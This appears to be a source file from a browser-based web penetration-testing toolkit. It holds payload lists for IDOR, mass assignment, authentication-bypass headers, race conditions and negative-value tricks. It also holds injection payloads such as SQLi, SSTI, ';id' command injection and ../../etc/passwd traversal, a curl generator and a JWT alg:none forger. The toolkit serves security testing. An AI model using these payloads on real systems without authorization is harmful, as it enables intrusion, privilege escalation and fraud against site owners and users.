              <code>is_admin=1</code>
              <code>isSuperAdmin=true</code>
              <code>isRoot=true</code>
              <code>isStaff=true</code>
              <code>user_type=superadmin</code>
              <code>user_type= administrator</code>
              <code>user_type=root</code>
              <code>user_role=admin</code>
              <code>account_type=business</code>
              <code>account_type=enterprise</code>
              <code>permission=write</code>
              <code>permission=delete</code>
              <code>permission=full</code>
              <code>permissions=["*"]</code>
              <code>permissions=["admin","write"]</code>
              <code>access_level=999</code>
              <code>access_level=0</code>
              <code>group=administrators</code>
              <code>group=superusers</code>
              <code>group=internal</code>
              <code>org=admin</code>
              <code>org=root</code>
              <code>tenant_id=1</code>
              <code>org_id=1</code>
              <code>company=admin</code>
              <code>department=IT</code>
              <code>tier=enterprise</code>
              <code>plan=unlimited</code>
              <code>level=99</code>
              <code>clearance=top_secret</code>
              <code>staff=true</code>
              <code>internal=true</code>
              <code>debug=true</code>
              <code>_debug=1</code>
              <code>test=true</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-sort-numeric-up"></i> IDOR Testing</h4>
            <div class="bizlogic-payloads">
              <code>/user/1 → /user/2</code>
              <code>/user/me → /user/admin</code>
              <code>/user/self → /user/1</code>
              <code>/profile/1 → /profile/2</code>
              <code>/account/1 → /account/2</code>
              <code>/order/123 → /order/124</code>
              <code>/order/123 → /order/0</code>
              <code>/order/123 → /order/-1</code>
              <code>/invoice/1 → /invoice/2</code>
              <code>/doc/1 → /doc/2</code>
              <code>/file/1 → /file/2</code>
              <code>/api/v1/users/{other_id}</code>
              <code>?id=me → ?id=admin</code>
              <code>?id=1 → ?id=0</code>
              <code>?id=1 → ?id=-1</code>
              <code>?user=other_user</code>
              <code>?user=admin</code>
              <code>?account_id=different</code>
              <code>?owner=other</code>
              <code>?uid=1 → ?uid=2</code>
              <code>?uuid=fake-uuid</code>
              <code>?ref=other_reference</code>
              <code>?token=other_token</code>
              <code>?session=other_session</code>
              <code>/api/v1/admin/users</code>
              <code>/internal/users</code>
              <code>/debug/users</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-clock"></i> Race Condition</h4>
            <div class="bizlogic-payloads">
              <code>Send 10 concurrent POST to /api/transfer</code>
              <code>Double-submit form rapidly</code>
              <code>Parallel coupon redemption (same code, 5x)</code>
              <code>Concurrent account creation (same email)</code>
              <code>Rapid password reset requests (10x)</code>
              <code>Parallel wallet top-up (same amount)</code>
              <code>Simultaneous like/upvote (same post)</code>
              <code>Concurrent vote submission</code>
              <code>Rapid-fire purchase (same item, low stock)</code>
              <code>Parallel file upload (overwrite race)</code>
              <code>Double-click submit on payment form</code>
              <code>Concurrent balance check + withdrawal</code>
              <code>Parallel ticket booking (same seat)</code>
              <code>Rapid session creation (token reuse)</code>
              <code>Concurrent promo code apply</code>
              <code>Parallel referral code usage</code>
              <code>Double-spend on limited coupon</code>
              <code>Concurrent stock decrement</code>
              <code>Rapid bid placement (auction)</code>
              <code>Parallel leaderboard update</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-step-forward"></i> Multi-Step Bypass</h4>
            <div class="bizlogic-payloads">
              <code>Skip step 1, go to /step-2</code>
              <code>Skip to /step-final directly</code>
              <code>Direct access to /confirm</code>
              <code>Direct access to /complete</code>
              <code>Direct access to /success</code>
              <code>Modify step=3 → step=1</code>
              <code>Remove CSRF token from form</code>
              <code>Reuse old CSRF token</code>
              <code>Reuse old verification code</code>
              <code>Resend verification, use old code</code>
              <code>Go back to step 1 after step 3</code>
              <code>Change wizard_id to other session</code>
              <code>Modify flow_id parameter</code>
              <code>Remove all session cookies, POST to /confirm</code>
              <code>Use expired magic link</code>
              <code>Reuse password reset token</code>
              <code>Skip email verification entirely</code>
              <code>Direct POST to /api/register/complete</code>
              <code>Modify checkout_step=payment → checkout_step=done</code>
              <code>Remove 2FA requirement parameter</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-redo"></i> State Manipulation</h4>
            <div class="bizlogic-payloads">
              <code>status=pending → status=completed</code>
              <code>status=active → status=cancelled</code>
              <code>status=draft → status=published</code>
              <code>status=suspended → status=active</code>
              <code>order_status=processing → order_status=shipped</code>
              <code>order_status=refunded → order_status=completed</code>
              <code>payment_status=paid</code>
              <code>payment_status=unpaid → payment_status=paid</code>
              <code>payment_status=failed → payment_status=success</code>
              <code>verified=false → verified=true</code>
              <code>email_verified=false → email_verified=true</code>
              <code>phone_verified=false → phone_verified=true</code>
              <code>approved=pending → approved=true</code>
              <code>approved=false → approved=true</code>
              <code>active=false → active=true</code>
              <code>deleted=false → deleted=true</code>
              <code>locked=false → locked=true</code>
              <code>blocked=false → blocked=true</code>
              <code>is_featured=false → is_featured=true</code>
              <code>is_pinned=false → is_pinned=true</code>
              <code>is_vip=false → is_vip=true</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-calculator"></i> Integer Overflow / Underflow</h4>
            <div class="bizlogic-payloads">
              <code>quantity=2147483647</code>
              <code>quantity=2147483648</code>
              <code>quantity=-2147483648</code>
              <code>quantity=-2147483649</code>
              <code>amount=999999999999</code>
              <code>id=0</code>
              <code>id=-1</code>
              <code>id=999999999999</code>
              <code>page=-1</code>
              <code>page=0</code>
              <code>limit=-1</code>
              <code>limit=0</code>
              <code>limit=999999</code>
              <code>offset=-1</code>
              <code>count=999999999</code>
              <code>size=0</code>
              <code>size=-1</code>
              <code>depth=999</code>
              <code>timeout=0</code>
              <code>timeout=-1</code>
              <code>retry=-1</code>
              <code>max_age=0</code>
              <code>expires=0</code>
              <code>ttl=-1</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-exchange-alt"></i> Negative Value Injection</h4>
            <div class="bizlogic-payloads">
              <code>amount=-1</code>
              <code>balance=-1</code>
              <code>credit=-1</code>
              <code>debit=-1</code>
              <code>points=-1</code>
              <code>rewards=-1</code>
              <code>credits=-1</code>
              <code>tokens=-1</code>
              <code>quantity=-1</code>
              <code>items=-1</code>
              <code>days=-1</code>
              <code>hours=-1</code>
              <code>discount=-50</code>
              <code>refund_amount=-100</code>
              <code>transfer_amount=-500</code>
              <code>withdrawal=-1000</code>
              <code>price=-0.01</code>
              <code>total=-999</code>
              <code>balance=0 → withdraw=100</code>
              <code>stock=-1 (infinite items)</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-user-secret"></i> Authentication Bypass</h4>
            <div class="bizlogic-payloads">
              <code>Remove Authorization header</code>
              <code>Authorization: Bearer null</code>
              <code>Authorization: Bearer undefined</code>
              <code>Authorization: Bearer ""</code>
              <code>Authorization: Bearer admin</code>
              <code>Cookie: session= (empty)</code>
              <code>Cookie: token= (empty)</code>
              <code>X-User-Id: 1</code>
              <code>X-User-Id: admin</code>
              <code>X-Forwarded-For: 127.0.0.1</code>
              <code>X-Real-IP: 127.0.0.1</code>
              <code>X-Original-URL: /admin</code>
              <code>X-Rewrite-URL: /admin</code>
              <code>X-Custom-IP-Authorization: 127.0.0.1</code>
              <code>X-Remote-IP: 127.0.0.1</code>
              <code>X-Client-IP: 127.0.0.1</code>
              <code>X-Forwarded-Host: admin.internal</code>
              <code>Host: localhost</code>
              <code>Referer: /admin</code>
              <code>Origin: http://localhost</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-at"></i> Email / Account Logic</h4>
            <div class="bizlogic-payloads">
              <code>Register with existing email</code>
              <code>Register with admin@target.com</code>
              <code>Register with +alias@target.com</code>
              <code>Login with empty password</code>
              <code>Reset password for admin@target.com</code>
              <code>Change email to admin@target.com</code>
              <code>Merge account with admin account</code>
              <code>Username enumeration via timing</code>
              <code>Brute-force 4-digit OTP</code>
              <code>Reuse expired JWT</code>
              <code>Refresh token after logout</code>
              <code>Session fixation via URL parameter</code>
              <code>Cookie without HttpOnly flag</code>
              <code>Cookie without Secure flag</code>
              <code>Cookie without SameSite</code>
              <code>JWT with alg:none</code>
              <code>JWT with expired exp</code>
              <code>JWT with no signature</code>
              <code>OAuth state parameter manipulation</code>
              <code>OAuth redirect_uri to attacker domain</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-layer-group"></i> Mass Assignment</h4>
            <div class="bizlogic-payloads">
              <code>{"role":"admin"}</code>
              <code>{"admin":true}</code>
              <code>{"is_verified":true}</code>
              <code>{"email_verified":true}</code>
              <code>{"balance":999999}</code>
              <code>{"credits":999999}</code>
              <code>{"plan":"enterprise"}</code>
              <code>{"subscription":"premium"}</code>
              <code>{"discount_code":"FREE"}</code>
              <code>{"referral_code":"SELF"}</code>
              <code>{"id":1}</code>
              <code>{"user_id":1}</code>
              <code>{"created_at":"2020-01-01"}</code>
              <code>{"last_login":"2099-01-01"}</code>
              <code>{"login_count":0}</code>
              <code>{"failed_attempts":0}</code>
              <code>{"locked":false}</code>
              <code>{"deleted":false}</code>
              <code>{"internal":true}</code>
              <code>{"staff":true}</code>
              <code>{"override_fee":0}</code>
              <code>{"tax_exempt":true}</code>
              <code>{"shipping_cost":0}</code>
              <code>{"_id":"admin"}</code>
              <code>{"__proto__":{"isAdmin":true}}</code>
            </div>
          </div>
          <div class="bizlogic-card">
            <h4><i class="fas fa-redo-alt"></i> Replay / Reuse Attacks</h4>
            <div class="bizlogic-payloads">
              <code>Replay completed payment request</code>
              <code>Reuse old session cookie after logout</code>
              <code>Reuse expired password reset link</code>
              <code>Replay email verification link</code>
              <code>Reuse old CSRF token</code>
              <code>Replay 2FA code after success</code>
              <code>Replay sign-up request with same email</code>
              <code>Replay file upload with virus content</code>
              <code>Replay import CSV with modified data</code>
              <code>Replay refund request</code>
              <code>Replay loyalty point credit</code>
              <code>Replay referral bonus</code>
              <code>Replay invite acceptance</code>
              <code>Replay subscription cancel → renew</code>
              <code>Replay draft save with poisoned data</code>
            </div>
          </div>
        </div>
      </div>
    `);
  }

  /* ============================================================
     P2-12: API FUZZING TEMPLATES
     ============================================================ */
  function apiFuzzPanelHTML() {
    return buildPanel("apifuzz", `
      <div class="apifuzz-section">
        <h3><i class="fas fa-database"></i> API Fuzzing Templates</h3>
        <p class="tool-desc">Generate fuzzing payloads for REST API vulnerabilities</p>
        <div class="apifuzz-form">
          <label>Vulnerability Type:</label>
          <select id="apiFuzzType">
            <option value="bola">BOLA (Broken Object Level Authorization)</option>
            <option value="mass">Mass Assignment</option>
            <option value="rate">Rate Limit Bypass</option>
            <option value="injection">Parameter Injection</option>
            <option value="enum">Enumeration</option>
          </select>
          <label>API Base URL:</label>
          <input type="text" id="apiFuzzBaseUrl" placeholder="https://target.com/api/v1" style="width:100%;" />
          <div style="margin-top:12px;">
            <button id="apiFuzzGenBtn" class="btn btn-primary"><i class="fas fa-code"></i><span>Generate Payloads</span></button>
          </div>
        </div>
        <div id="apiFuzzResults" class="apifuzz-results" style="margin-top:16px;"></div>
      </div>
    `);
  }

  const API_FUZZ_TEMPLATES = {
    bola: {
      name: "BOLA (Broken Object Level Authorization)",
      payloads: [
        "GET /api/users/{id} — Try incrementing/decrementing ID",
        "GET /api/users/1 → GET /api/users/2",
        "GET /api/orders/{id} — Access other users' orders",
        "GET /api/files/{id} — Read arbitrary files",
        "PUT /api/users/{other_id} — Modify other users",
        "DELETE /api/resources/{id} — Delete others' resources",
        "GET /api/admin/users — Try regular user token",
        "GET /api/internal/config — Try external access"
      ]
    },
    mass: {
      name: "Mass Assignment",
      payloads: [
        'Add "role":"admin" to user registration',
        'Add "is_admin":true to profile update',
        'Add "price":0 to order creation',
        'Add "verified":true to signup',
        'Add "balance":999999 to payment',
        'Add "discount":100 to coupon',
        'Add "id":999 to creation endpoint',
        'Add "created_at":"2000-01-01" to any object'
      ]
    },
    rate: {
      name: "Rate Limit Bypass",
      payloads: [
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Client-IP: 127.0.0.1",
        "X-Forwarded-Host: 127.0.0.1",
        "Via: 1.1 127.0.0.1",
        "Use different HTTP method (GET vs POST)",
        "Add random query parameters (?v=1, ?v=2)",
        "Change Content-Type header",
        "Use HTTP/1.0 instead of HTTP/1.1",
        "Use chunked transfer encoding",
        "Add whitespace in header names"
      ]
    },
    injection: {
      name: "Parameter Injection",
      payloads: [
        "Add SQL: ' OR '1'='1 to every parameter",
        "Add SSTI: {{7*7}} to every parameter",
        "Add CMD: ;id to every parameter",
        "Add LDAP: *)(uid=*))(|(uid=* to every parameter",
        "Add XML: <![CDATA[<script>alert(1)</script>]]>",
        "Add NoSQL: {\"$gt\":\"\"} to every parameter",
        "Add Template: ${7*7} to every parameter",
        "Add Path Traversal: ../../etc/passwd"
      ]
    },
    enum: {
      name: "Enumeration",
      payloads: [
        "GET /api/users?email=admin@target.com",
        "GET /api/users?username=admin",
        "GET /api/users?search=admin",
        "GET /api/users?role=admin",
        "GET /api/users?sort=-created_at",
        "GET /api/users?limit=1000",
        "GET /api/users?fields=id,email,password_hash",
        "POST /api/auth/login — Try existing email with wrong password",
        "POST /api/auth/forgot-password — Enumerate valid emails"
      ]
    }
  };

  function generateApiFuzz() {
    const type = $("apiFuzzType")?.value || "bola";
    const baseUrl = $("apiFuzzBaseUrl")?.value?.trim() || "https://target.com/api/v1";
    const template = API_FUZZ_TEMPLATES[type];

    $("apiFuzzResults").innerHTML = `
      <h4>${esc(template.name)}</h4>
      <div class="apifuzz-payload-list">
        ${template.payloads.map((p, i) => `
          <div class="apifuzz-payload">
            <span class="apifuzz-num">${i + 1}</span>
            <code>${esc(p)}</code>
          </div>
        `).join("")}
      </div>
      <h4 style="margin-top:16px;">cURL Commands</h4>
      <div class="apifuzz-curl">
        ${template.payloads.map(p => {
          const method = p.startsWith("GET") ? "GET" : p.startsWith("POST") ? "POST" : p.startsWith("PUT") ? "PUT" : p.startsWith("DELETE") ? "DELETE" : "GET";
          const path = p.split("—")[0].trim().replace(/^(GET|POST|PUT|DELETE)\s+/, "").replace(/\{id\}/g, "1");
          return `<code>curl -X ${method} "${baseUrl}${esc(path)}" -H "Authorization: Bearer YOUR_TOKEN"</code>`;
        }).join("\n")}
      </div>
    `;
  }

  /* ============================================================
     INITIALIZATION & EVENT WIRING
     ============================================================ */
  function addTabs() {
    const tabs = document.getElementById("toolkit-tabs");
    if (!tabs || tabs.dataset.tk5done) return;
    tabs.dataset.tk5done = "1";

    const newTabs = [
      ["dnsbrute", "fas fa-network-wired", "DNS Brute"],
      ["ssrf", "fas fa-server", "SSRF"],
      ["wafbypass", "fas fa-shield-virus", "WAF Bypass"],
      ["corsdeep", "fas fa-globe", "CORS Deep"],
      ["cspbypass", "fas fa-ban", "CSP Bypass"],
      ["dirbrute", "fas fa-folder-tree", "Dir Brute"],
      ["oauthsaml", "fas fa-key", "OAuth/SAML"],
      ["jwtadvanced", "fas fa-ticket", "JWT Attacks"],
      ["graphqlabuse", "fas fa-project-diagram", "GraphQL+"],
      ["grpc", "fas fa-exchange-alt", "gRPC"],
      ["bizlogic", "fas fa-brain", "Biz Logic"],
      ["apifuzz", "fas fa-database", "API Fuzz"]
    ];

    newTabs.forEach(([id, icon, label]) => {
      const btn = document.createElement("button");
      btn.className = "tab-btn";
      btn.dataset.tkTab = id;
      btn.innerHTML = `<i class="${icon}"></i><span>${label}</span>`;
      btn.addEventListener("click", () => {
        document.querySelectorAll("#toolkit-tabs .tab-btn").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        document.querySelectorAll(".tk-panel").forEach(p => { p.style.display = "none"; });
        const panel = document.getElementById(`tk-panel-${id}`);
        if (panel) panel.style.display = "block";
      });
      tabs.appendChild(btn);
    });

    const section = tabs.parentElement;
    const panelsHtml = [
      dnsBrutePanelHTML(), ssrfPanelHTML(), wafBypassPanelHTML(),
      corsDeepPanelHTML(), cspBypassPanelHTML(), dirBrutePanelHTML(),
      oauthSamlPanelHTML(), jwtAdvancedPanelHTML(), graphqlAbusePanelHTML(),
      grpcPanelHTML(), bizLogicPanelHTML(), apiFuzzPanelHTML()
    ].join("\n");
    const tmp = document.createElement("div");
    tmp.innerHTML = panelsHtml;
    while (tmp.firstChild) section.appendChild(tmp.firstChild);
  }

  document.addEventListener("DOMContentLoaded", () => {
    addTabs();

    // DNS Brute-Force
    $("dnsBruteStart")?.addEventListener("click", dnsBruteForce);
    $("dnsBruteStop")?.addEventListener("click", () => { dnsBruteRunning = false; });
    $("dnsBruteWordlist")?.addEventListener("change", (e) => {
      $("dnsBruteCustom").style.display = e.target.value === "custom" ? "block" : "none";
    });

    // SSRF
    $("ssrfStart")?.addEventListener("click", generateSsrfPayloads);
    $("ssrfCopyAll")?.addEventListener("click", () => {
      const payloads = document.querySelectorAll(".ssrf-payload-code");
      const text = Array.from(payloads).map(el => el.textContent).join("\n");
      navigator.clipboard.writeText(text).then(() => toast("All payloads copied", "success"));
    });

    // WAF Bypass
    $("wafGenBtn")?.addEventListener("click", generateWafPayloads);

    // CORS Deep
    $("corsDeepStart")?.addEventListener("click", testCorsDeep);

    // CSP Bypass
    $("cspBypassStart")?.addEventListener("click", analyzeCsp);

    // Dir Brute
    $("dirBruteStart")?.addEventListener("click", runDirBrute);
    $("dirBruteStop")?.addEventListener("click", () => { dirBruteRunning = false; });

    // OAuth/SAML tabs
    document.querySelectorAll(".oauth-tab").forEach(btn => {
      btn.addEventListener("click", () => {
        document.querySelectorAll(".oauth-tab").forEach(b => b.classList.remove("active"));
        document.querySelectorAll(".oauth-tab-content").forEach(c => c.style.display = "none");
        btn.classList.add("active");
        const tab = $(btn.dataset.tab);
        if (tab) tab.style.display = "block";
      });
    });

    // JWT Advanced
    $("tokenAnalyzeBtn")?.addEventListener("click", () => {
      const token = $("tokenInput")?.value?.trim();
      if (!token) { toast("Paste a JWT or access token", "error"); return; }
      const resultEl = $("tokenAnalysisResult");
      if (!resultEl) return;
      // Decode JWT if it has 3 parts
      const parts = token.split(".");
      if (parts.length === 3) {
        try {
          const header = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
          const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
          let html = `<div class="jwt-section"><h4>Header</h4><pre>${esc(JSON.stringify(header, null, 2))}</pre><h4>Payload</h4><pre>${esc(JSON.stringify(payload, null, 2))}</pre></div>`;
          if (header.alg !== "none") {
            const forged = btoa(JSON.stringify({ ...header, alg: "none" })).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
            html += `<div class="jwt-section"><h4>Alg:none Attack</h4><code class="jwt-forged">${esc(forged + "." + parts[1] + ".")}</code></div>`;
          }
          if (payload.exp && payload.exp < Date.now() / 1000) html += `<div class="jwt-warning">${badge("WARNING", "warning")} Token is EXPIRED</div>`;
          resultEl.innerHTML = html;
        } catch { resultEl.innerHTML = `<p class="error">Failed to decode JWT</p>`; }
      } else {
        // Non-JWT token — just show raw decoded info
        resultEl.innerHTML = `<h4>Token Info</h4><p>Length: ${token.length} chars</p><p>Type: ${token.startsWith("ey") ? "Likely JWT" : "Opaque/Bearer token"}</p><pre>${esc(token.slice(0, 200))}${token.length > 200 ? "..." : ""}</pre>`;
      }
    });
    document.querySelectorAll(".jwt-attack-btn").forEach(btn => {
      btn.addEventListener("click", () => analyzeJwt());
    });

    // GraphQL Abuse
    document.querySelectorAll(".graphql-attack-btn").forEach(btn => {
      btn.addEventListener("click", () => runGraphQLAttack(btn.dataset.query));
    });

    // gRPC
    $("grpcScanBtn")?.addEventListener("click", scanGrpc);

    // API Fuzz
    $("apiFuzzGenBtn")?.addEventListener("click", generateApiFuzz);
  });
})();
